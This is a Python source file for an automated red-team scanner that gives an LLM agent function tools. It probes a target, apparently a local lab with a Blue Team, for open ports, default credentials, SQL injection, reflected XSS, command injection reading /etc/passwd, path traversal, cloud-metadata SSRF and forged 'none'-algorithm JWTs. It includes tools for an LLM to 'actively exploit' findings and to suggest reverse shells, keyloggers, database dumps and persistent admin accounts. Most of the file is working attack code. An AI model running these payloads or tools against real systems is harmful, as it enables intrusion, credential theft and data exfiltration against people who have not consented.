"""
Enhanced pre-scan with port discovery, auth testing, and ruthless filtering.
Only HIGH severity findings passed to LLM.
"""
import os
from typing import Dict, List, Any, Optional, Tuple
import httpx
from urllib.parse import urlparse

try:
    from orchestrator.oai_agents import function_tool
except ModuleNotFoundError:
    from oai_agents import function_tool


TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:8001")

# Common ports to test
COMMON_PORTS = [80, 443, 8000, 8001, 8080, 8443, 3000, 5000, 9000]

# Focused endpoint list - only security-critical paths
CRITICAL_ENDPOINTS = [
    # Auth endpoints (HIGH PRIORITY)
    "/api/auth/login", "/api/auth/register", "/api/auth/logout", "/api/auth/token",
    "/api/auth/refresh", "/api/auth/reset-password", "/api/auth/verify",
    "/login", "/register", "/logout", "/reset-password", "/forgot-password",
    "/api/users/me", "/api/users/profile", "/api/users/password",

    # Admin endpoints (HIGH PRIORITY)
    "/api/admin", "/api/admin/users", "/api/admin/config", "/admin", "/admin/login",

    # API endpoints with injection potential
    "/api/products", "/api/search", "/api/users", "/api/orders",
    "/api/comments", "/api/reviews",

    # File operations (Path traversal potential)
    "/api/upload", "/api/download", "/api/files", "/upload", "/download",

    # Proxy endpoints (SSRF potential)
    "/api/proxy", "/api/image-proxy", "/api/fetch",

    # Internal/debug endpoints
    "/internal/logs", "/internal/config", "/debug", "/status",

    # Common sensitive files
    "/.env", "/.git/config", "/config.json", "/backup.sql",
]

# High-impact SQLi payloads only
SQLI_PAYLOADS_HIGH_IMPACT = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "admin'--",
]

# XSS payloads (reflected only)
XSS_PAYLOADS_REFLECTED = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

# Authentication test cases
AUTH_TESTS = {
    "default_creds": [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "root", "password": "root"},
        {"username": "admin", "password": "12345"},
    ],
    "weak_passwords": ["password", "12345", "admin", "test"],
    "jwt_none_algorithm": True,  # Test JWT with none algorithm
    "session_fixation": True,  # Test session fixation
}

# Command injection (high-impact only)
CMDI_PAYLOADS_CRITICAL = ["; cat /etc/passwd", "| cat /etc/passwd", "; whoami"]

# Path traversal (confirmed only)
PATH_TRAVERSAL_CRITICAL = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"]

# SSRF (AWS/GCP metadata only)
SSRF_CRITICAL = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
]


def discover_ports(base_host: str) -> List[Tuple[str, int]]:
    """
    Discover which ports are open on the target.
    Returns list of (protocol, port) tuples.
    """
    parsed = urlparse(base_host)
    hostname = parsed.hostname or "localhost"

    open_ports = []
    for port in COMMON_PORTS:
        for protocol in ["http", "https"]:
            url = f"{protocol}://{hostname}:{port}/"
            try:
                resp = httpx.get(url, timeout=2.0, follow_redirects=False)
                if resp.status_code < 500:  # Any response = port open
                    open_ports.append((protocol, port))
                    break  # Found it, no need to test other protocol
            except:
                continue

    return open_ports


def test_authentication_bypass(url: str, timeout: float = 2.0) -> Optional[Dict[str, Any]]:
    """
    Test for authentication bypass vulnerabilities (HIGH PRIORITY).
    Only returns if bypass confirmed.
    """
    vulnerabilities = []

    # Test 1: Default credentials
    for creds in AUTH_TESTS["default_creds"]:
        try:
            resp = httpx.post(
                url,
                json=creds,
                timeout=timeout,
                follow_redirects=False
            )

            # Check for successful auth indicators
            body_lower = resp.text.lower()
            if any(kw in body_lower for kw in ["token", "session", "logged in", "success", "welcome"]):
                if resp.status_code in [200, 201, 302]:
                    vulnerabilities.append({
                        "type": "Default Credentials",
                        "creds": f"{creds['username']}:{creds['password']}",
                        "proof": resp.text[:100]
                    })
        except:
            continue

    # Test 2: SQL injection in auth (critical)
    for payload in SQLI_PAYLOADS_HIGH_IMPACT[:2]:
        try:
            resp = httpx.post(
                url,
                json={"username": payload, "password": "anything"},
                timeout=timeout
            )

            body_lower = resp.text.lower()
            if any(kw in body_lower for kw in ["token", "session", "logged in"]) and resp.status_code in [200, 302]:
                vulnerabilities.append({
                    "type": "SQLi Auth Bypass",
                    "payload": payload,
                    "proof": resp.text[:100]
                })
        except:
            continue

    # Test 3: JWT none algorithm (if JWT endpoint)
    if "token" in url or "jwt" in url:
        try:
            # Try to decode with none algorithm
            import base64
            fake_jwt = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode() + ".eyJzdWIiOiJhZG1pbiJ9."

            resp = httpx.get(
                url.replace("/login", "/verify"),
                headers={"Authorization": f"Bearer {fake_jwt}"},
                timeout=timeout
            )

            if resp.status_code == 200:
                vulnerabilities.append({
                    "type": "JWT None Algorithm",
                    "proof": "Accepted JWT with none algorithm"
                })
        except:
            pass

    if vulnerabilities:
        return {
            "url": url,
            "vulnerabilities": vulnerabilities,
            "severity": "CRITICAL"
        }

    return None


def test_sqli_critical(url: str, timeout: float = 1.5) -> Optional[Dict[str, Any]]:
    """
    Test SQL injection - only return if CONFIRMED vulnerable.
    """
    for payload in SQLI_PAYLOADS_HIGH_IMPACT:
        try:
            resp = httpx.get(
                url,
                params={"search": payload, "q": payload, "id": payload},
                timeout=timeout
            )
            body_lower = resp.text.lower()

            # Only report if clear SQL error (confirmed vuln)
            if any(kw in body_lower for kw in [
                "sql syntax", "mysql", "database error", "unclosed quotation",
                "union", "sqlite_", "pg_", "ora-"
            ]):
                return {
                    "url": url,
                    "type": "SQL Injection",
                    "payload": payload,
                    "proof": resp.text[:150],
                    "severity": "CRITICAL"
                }
        except:
            continue

    return None


def test_xss_reflected(url: str, timeout: float = 1.5) -> Optional[Dict[str, Any]]:
    """
    Test for reflected XSS - only report if payload reflected unencoded.
    """
    for payload in XSS_PAYLOADS_REFLECTED:
        try:
            resp = httpx.get(url, params={"q": payload, "comment": payload}, timeout=timeout)

            # Check if payload is reflected unencoded (confirmed XSS)
            if payload in resp.text:
                # Verify it's not in a comment or encoded
                if "<script>" in resp.text or "onerror=" in resp.text or "onload=" in resp.text:
                    return {
                        "url": url,
                        "type": "Reflected XSS",
                        "payload": payload,
                        "severity": "HIGH"
                    }
        except:
            continue

    return None


def test_command_injection_critical(url: str, timeout: float = 2.0) -> Optional[Dict[str, Any]]:
    """
    Test command injection - only report if command output confirmed.
    """
    for payload in CMDI_PAYLOADS_CRITICAL:
        try:
            resp = httpx.get(url, params={"cmd": payload, "file": payload}, timeout=timeout)
            body_lower = resp.text.lower()

            # Look for confirmed command execution
            if any(kw in body_lower for kw in ["root:x:", "uid=", "bin/bash", "etc/passwd"]):
                return {
                    "url": url,
                    "type": "Command Injection",
                    "payload": payload,
                    "proof": resp.text[:150],
                    "severity": "CRITICAL"
                }
        except:
            continue

    return None


def test_path_traversal_critical(url: str, timeout: float = 1.5) -> Optional[Dict[str, Any]]:
    """
    Test path traversal - only report if file contents confirmed.
    """
    for payload in PATH_TRAVERSAL_CRITICAL:
        try:
            resp = httpx.get(url, params={"file": payload, "path": payload, "filename": payload}, timeout=timeout)
            body_lower = resp.text.lower()

            # Check for confirmed file access
            if "root:x:" in body_lower or "[extensions]" in body_lower:
                return {
                    "url": url,
                    "type": "Path Traversal",
                    "payload": payload,
                    "proof": resp.text[:150],
                    "severity": "CRITICAL"
                }
        except:
            continue

    return None


def test_ssrf_critical(url: str, timeout: float = 2.0) -> Optional[Dict[str, Any]]:
    """
    Test SSRF - only report if cloud metadata accessed.
    """
    for payload in SSRF_CRITICAL:
        try:
            resp = httpx.get(url, params={"url": payload, "target": payload}, timeout=timeout)
            body_lower = resp.text.lower()

            # Check for cloud metadata access
            if any(kw in body_lower for kw in ["ami-id", "instance-id", "access_token", "project-id"]):
                return {
                    "url": url,
                    "type": "SSRF (Cloud Metadata)",
                    "payload": payload,
                    "proof": resp.text[:150],
                    "severity": "CRITICAL"
                }
        except:
            continue

    return None


def test_broken_access_control(base_url: str, timeout: float = 2.0) -> List[Dict[str, Any]]:
    """
    Test for broken access control (IDOR, privilege escalation).
    """
    findings = []

    # Test 1: IDOR on user endpoints
    user_endpoints = ["/api/users/1", "/api/users/2", "/api/users/admin"]
    for endpoint in user_endpoints:
        url = f"{base_url}{endpoint}"
        try:
            # Try without auth
            resp = httpx.get(url, timeout=timeout)
            if resp.status_code == 200:
                body_lower = resp.text.lower()
                if any(kw in body_lower for kw in ["email", "password", "token", "user"]):
                    findings.append({
                        "url": url,
                        "type": "IDOR / Broken Access Control",
                        "proof": f"Accessed user data without auth: {resp.text[:100]}",
                        "severity": "HIGH"
                    })
        except:
            continue

    # Test 2: Admin endpoint access without auth
    admin_endpoints = ["/api/admin", "/api/admin/users", "/admin"]
    for endpoint in admin_endpoints:
        url = f"{base_url}{endpoint}"
        try:
            resp = httpx.get(url, timeout=timeout)
            if resp.status_code == 200:
                findings.append({
                    "url": url,
                    "type": "Unauthorized Admin Access",
                    "proof": "Admin endpoint accessible without auth",
                    "severity": "CRITICAL"
                })
        except:
            continue

    return findings


def run_prescan(target_url: str = None) -> Dict[str, Any]:
    """
    Run enhanced pre-scan with port discovery and auth-focused testing.
    ONLY returns HIGH/CRITICAL severity findings.
    """
    if target_url is None:
        target_url = TARGET_URL

    parsed = urlparse(target_url)
    base_host = f"{parsed.scheme}://{parsed.netloc}"

    # Phase 1: Port discovery
    print(f"[RECON] Discovering open ports on {base_host}...")
    open_ports = discover_ports(base_host)

    if not open_ports:
        # Fallback to original target
        open_ports = [(parsed.scheme, parsed.port or 8001)]

    all_findings = {
        "critical": [],
        "high": [],
        "ports_tested": open_ports,
        "total_endpoints_tested": 0
    }

    # Phase 2: Test each open port
    for protocol, port in open_ports:
        current_base = f"{protocol}://{parsed.hostname}:{port}"
        print(f"[RECON] Testing {current_base}...")

        # Test authentication endpoints (HIGHEST PRIORITY)
        auth_endpoints = [ep for ep in CRITICAL_ENDPOINTS if "auth" in ep or "login" in ep]
        for endpoint in auth_endpoints:
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_authentication_bypass(url)
            if result:
                all_findings["critical"].append(result)

        # Test access control
        access_findings = test_broken_access_control(current_base)
        all_findings["total_endpoints_tested"] += 3
        for finding in access_findings:
            if finding["severity"] == "CRITICAL":
                all_findings["critical"].append(finding)
            else:
                all_findings["high"].append(finding)

        # Test SQL injection on key endpoints
        api_endpoints = [ep for ep in CRITICAL_ENDPOINTS if "/api/" in ep and "auth" not in ep]
        for endpoint in api_endpoints[:10]:  # Top 10 only
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_sqli_critical(url)
            if result:
                all_findings["critical"].append(result)

        # Test XSS on search/comment endpoints
        xss_targets = [ep for ep in CRITICAL_ENDPOINTS if any(kw in ep for kw in ["search", "comment", "review"])]
        for endpoint in xss_targets:
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_xss_reflected(url)
            if result:
                all_findings["high"].append(result)

        # Test command injection on file/upload endpoints
        file_endpoints = [ep for ep in CRITICAL_ENDPOINTS if any(kw in ep for kw in ["upload", "download", "file"])]
        for endpoint in file_endpoints:
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_command_injection_critical(url)
            if result:
                all_findings["critical"].append(result)

        # Test path traversal
        for endpoint in file_endpoints:
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_path_traversal_critical(url)
            if result:
                all_findings["critical"].append(result)

        # Test SSRF on proxy endpoints
        proxy_endpoints = [ep for ep in CRITICAL_ENDPOINTS if "proxy" in ep]
        for endpoint in proxy_endpoints:
            url = f"{current_base}{endpoint}"
            all_findings["total_endpoints_tested"] += 1

            result = test_ssrf_critical(url)
            if result:
                all_findings["critical"].append(result)

    # Summary
    total_vulns = len(all_findings["critical"]) + len(all_findings["high"])

    return {
        "total_tested": all_findings["total_endpoints_tested"],
        "ports_discovered": len(open_ports),
        "vulnerabilities_found": total_vulns,
        "critical_count": len(all_findings["critical"]),
        "high_count": len(all_findings["high"]),
        "findings": all_findings
    }


def format_findings_for_llm(prescan_result: Dict[str, Any]) -> str:
    """
    Format findings for LLM - ONLY HIGH/CRITICAL issues.
    Ruthlessly concise.
    """
    findings = prescan_result["findings"]

    lines = [
        f"Pre-scan: {prescan_result['total_tested']} endpoints tested across {prescan_result['ports_discovered']} ports.",
        f"Found: {prescan_result['critical_count']} CRITICAL, {prescan_result['high_count']} HIGH severity issues.",
        ""
    ]

    # Critical findings
    if findings["critical"]:
        lines.append("=== CRITICAL VULNERABILITIES ===")
        for vuln in findings["critical"]:
            if "vulnerabilities" in vuln:
                # Auth bypass with multiple issues
                lines.append(f"\n{vuln['url']} - Authentication Issues:")
                for v in vuln["vulnerabilities"]:
                    lines.append(f"  • {v['type']}")
                    if "creds" in v:
                        lines.append(f"    Creds: {v['creds']}")
                    if "payload" in v:
                        lines.append(f"    Payload: {v['payload']}")
                    lines.append(f"    Proof: {v['proof']}")
            else:
                # Single vulnerability
                lines.append(f"\n{vuln['url']} - {vuln['type']}")
                if "payload" in vuln:
                    lines.append(f"  Payload: {vuln['payload']}")
                lines.append(f"  Proof: {vuln['proof']}")
        lines.append("")

    # High findings
    if findings["high"]:
        lines.append("=== HIGH SEVERITY ===")
        for vuln in findings["high"]:
            lines.append(f"\n{vuln['url']} - {vuln['type']}")
            if "payload" in vuln:
                lines.append(f"  Payload: {vuln['payload']}")
            if "proof" in vuln:
                lines.append(f"  Proof: {vuln['proof']}")
        lines.append("")

    if not findings["critical"] and not findings["high"]:
        lines.append("No critical vulnerabilities found in initial scan.")
        lines.append("Suggest: Deeper auth testing, API fuzzing, advanced injection techniques.")

    return "\n".join(lines)


@function_tool
def deep_dive_endpoint(url: str, attack_type: str) -> Dict[str, Any]:
    """
    Tool for LLM to request deeper analysis of specific endpoint.
    This allows LLM to guide the red team based on initial findings.
    """
    results = {
        "url": url,
        "attack_type": attack_type,
        "findings": []
    }

    if attack_type == "sqli":
        # Try all SQLi payloads
        for payload in SQLI_PAYLOADS_HIGH_IMPACT:
            try:
                resp = httpx.get(url, params={"q": payload, "id": payload, "search": payload}, timeout=2.0)
                if "sql" in resp.text.lower() or "database" in resp.text.lower():
                    results["findings"].append({
                        "payload": payload,
                        "response": resp.text[:200]
                    })
            except:
                continue

    elif attack_type == "auth":
        # Try all auth bypass techniques
        for creds in AUTH_TESTS["default_creds"]:
            try:
                resp = httpx.post(url, json=creds, timeout=2.0)
                if resp.status_code in [200, 302]:
                    results["findings"].append({
                        "technique": "default_creds",
                        "creds": f"{creds['username']}:{creds['password']}",
                        "response": resp.text[:200]
                    })
            except:
                continue

    return results


@function_tool
def exploit_vulnerability(url: str, vuln_type: str, attempts: int = 3) -> Dict[str, Any]:
    """
    Tool for LLM to actively exploit a vulnerability multiple times.
    This creates noise in the logs so Blue Team can detect the attack.

    Args:
        url: Target endpoint URL
        vuln_type: Type of vulnerability (sqli, xss, cmdi, path_traversal, etc.)
        attempts: Number of exploitation attempts (3-5 recommended)

    Returns:
        Dictionary with exploitation results
    """
    print(f"[EXPLOIT] Exploiting {vuln_type} at {url} ({attempts} attempts)...")

    results = {
        "url": url,
        "vuln_type": vuln_type,
        "attempts": attempts,
        "successful": 0,
        "failed": 0,
        "logs": []
    }

    for i in range(attempts):
        try:
            if vuln_type == "sqli":
                # SQLi exploitation
                payload = SQLI_PAYLOADS_HIGH_IMPACT[i % len(SQLI_PAYLOADS_HIGH_IMPACT)]
                resp = httpx.get(url, params={"q": payload, "id": payload, "search": payload}, timeout=2.0)
                success = "sql" in resp.text.lower() or "database" in resp.text.lower()

            elif vuln_type == "xss":
                # XSS exploitation
                payload = XSS_PAYLOADS_REFLECTED[i % len(XSS_PAYLOADS_REFLECTED)]
                resp = httpx.get(url, params={"q": payload, "comment": payload}, timeout=2.0)
                success = payload in resp.text

            elif vuln_type == "cmdi":
                # Command injection exploitation
                payload = CMDI_PAYLOADS_CRITICAL[i % len(CMDI_PAYLOADS_CRITICAL)]
                resp = httpx.get(url, params={"cmd": payload, "file": payload}, timeout=2.0)
                success = "root:" in resp.text.lower() or "uid=" in resp.text.lower()

            elif vuln_type == "path_traversal":
                # Path traversal exploitation
                payload = PATH_TRAVERSAL_CRITICAL[i % len(PATH_TRAVERSAL_CRITICAL)]
                resp = httpx.get(url, params={"file": payload, "path": payload}, timeout=2.0)
                success = "root:x:" in resp.text.lower() or "[extensions]" in resp.text.lower()

            elif vuln_type == "auth_bypass":
                # Auth bypass exploitation
                creds = AUTH_TESTS["default_creds"][i % len(AUTH_TESTS["default_creds"])]
                resp = httpx.post(url, json=creds, timeout=2.0)
                success = resp.status_code in [200, 302]
                payload = f"{creds['username']}:{creds['password']}"

            else:
                # Generic exploitation
                resp = httpx.get(url, timeout=2.0)
                success = resp.status_code == 200
                payload = "(generic)"

            if success:
                results["successful"] += 1
                results["logs"].append(f"✓ Attempt {i+1}: Exploited with {payload}")
            else:
                results["failed"] += 1
                results["logs"].append(f"✗ Attempt {i+1}: Failed with {payload}")

        except Exception as e:
            results["failed"] += 1
            results["logs"].append(f"✗ Attempt {i+1}: Error - {str(e)[:50]}")

    results["success_rate"] = f"{results['successful']}/{attempts}"
    print(f"[EXPLOIT] Complete: {results['success_rate']} successful")

    return results


@function_tool
def suggest_next_attacks(confirmed_vulns: List[Dict[str, str]]) -> Dict[str, Any]:
    """
    Tool for LLM to suggest follow-up attacks based on confirmed findings.

    Args:
        confirmed_vulns: List of confirmed vulnerabilities with type, url, severity

    Returns:
        Dictionary with suggested attack vectors
    """
    suggestions = {
        "immediate_follow_ups": [],
        "privilege_escalation": [],
        "lateral_movement": [],
        "data_exfiltration": []
    }

    for vuln in confirmed_vulns:
        vuln_type = vuln.get("type", "").lower()
        url = vuln.get("url", "")
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # SQLi follow-ups
        if "sql" in vuln_type:
            suggestions["immediate_follow_ups"].extend([
                {
                    "target": url,
                    "attack": "UNION-based data extraction",
                    "reasoning": "Confirmed SQLi - attempt to extract database schema"
                },
                {
                    "target": url,
                    "attack": "Boolean-based blind SQLi",
                    "reasoning": "Test for blind injection variants"
                },
                {
                    "target": base_url + "/api/admin",
                    "attack": "SQLi on admin endpoints",
                    "reasoning": "If /api endpoint is vulnerable, admin endpoints might be too"
                }
            ])
            suggestions["privilege_escalation"].append({
                "target": url,
                "attack": "SQL injection to extract admin credentials",
                "reasoning": "Use UNION to query users table for admin creds"
            })
            suggestions["data_exfiltration"].append({
                "target": url,
                "attack": "Database dump via SQLi",
                "reasoning": "Extract sensitive data from all tables"
            })

        # XSS follow-ups
        if "xss" in vuln_type:
            suggestions["immediate_follow_ups"].extend([
                {
                    "target": url,
                    "attack": "Session hijacking via XSS",
                    "reasoning": "Use XSS to steal session tokens"
                },
                {
                    "target": url,
                    "attack": "Keylogger injection",
                    "reasoning": "Inject keylogger to capture credentials"
                }
            ])
            suggestions["lateral_movement"].append({
                "target": url,
                "attack": "XSS to admin account takeover",
                "reasoning": "Target admin users with XSS payload"
            })

        # Auth bypass follow-ups
        if "auth" in vuln_type or "credential" in vuln_type:
            suggestions["immediate_follow_ups"].extend([
                {
                    "target": base_url + "/api/admin",
                    "attack": "Access admin endpoints with compromised creds",
                    "reasoning": "Default creds confirmed - try admin access"
                },
                {
                    "target": base_url + "/api/users",
                    "attack": "User enumeration",
                    "reasoning": "List all users with admin access"
                }
            ])
            suggestions["privilege_escalation"].append({
                "target": base_url + "/api/admin/users",
                "attack": "Create new admin account",
                "reasoning": "Persistence via new admin user"
            })

        # Broken access control follow-ups
        if "idor" in vuln_type or "access control" in vuln_type:
            suggestions["immediate_follow_ups"].append({
                "target": base_url + "/api/users/admin",
                "attack": "Access admin user data",
                "reasoning": "IDOR confirmed - enumerate sensitive user accounts"
            })
            suggestions["data_exfiltration"].append({
                "target": base_url + "/api/users",
                "attack": "Enumerate all user accounts",
                "reasoning": "Extract complete user database via IDOR"
            })

        # Command injection follow-ups
        if "command" in vuln_type or "cmdi" in vuln_type:
            suggestions["immediate_follow_ups"].extend([
                {
                    "target": url,
                    "attack": "Reverse shell",
                    "reasoning": "RCE confirmed - establish persistent shell"
                },
                {
                    "target": url,
                    "attack": "System enumeration",
                    "reasoning": "List users, network, running processes"
                }
            ])
            suggestions["privilege_escalation"].append({
                "target": url,
                "attack": "Kernel exploit search",
                "reasoning": "Check kernel version for privilege escalation vulns"
            })

    # Add generic suggestions if no specific vulns
    if not any(suggestions.values()):
        suggestions["immediate_follow_ups"] = [
            {"target": "Various", "attack": "Fuzzing for hidden endpoints", "reasoning": "No confirmed vulns - broaden search"},
            {"target": "Various", "attack": "Try parameter pollution", "reasoning": "Test HTTP parameter pollution"},
        ]

    return suggestions
